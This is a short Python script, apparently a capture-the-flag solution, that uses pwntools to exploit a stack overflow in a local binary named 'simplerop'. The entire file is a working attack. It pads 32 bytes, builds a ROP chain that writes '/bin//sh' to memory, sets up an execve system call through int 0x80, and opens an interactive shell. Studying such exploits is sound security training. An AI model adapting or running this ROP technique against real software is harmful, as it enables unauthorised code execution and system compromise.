#!/usr/bin/env python
# -*-coding : utf-8
from pwn import *
# context.log_level = 'debug'

io = process("./simplerop")

eax_ret = 0x80bae06
edcbx_ret = 0x806e850
int_80 = 0x80493e1

write = 0x809a15d   #mov dword ptr [edx], eax ; ret
edx_ret = 0x806e82a
data = 0x80ea060

payload = 'a'*32
payload += p32(edx_ret) + p32(data)
payload += p32(eax_ret) + "/bin"
payload += p32(write)
payload += p32(edx_ret) + p32(data + 4)
payload += p32(eax_ret) + "//sh"
payload += p32(write)

payload += p32(eax_ret) + p32(0xb)
payload += p32(edcbx_ret) + p32(0) + p32(0) + p32(data)
payload += p32(int_80)

io.recvuntil("input :")
io.sendline(payload)
io.interactive()
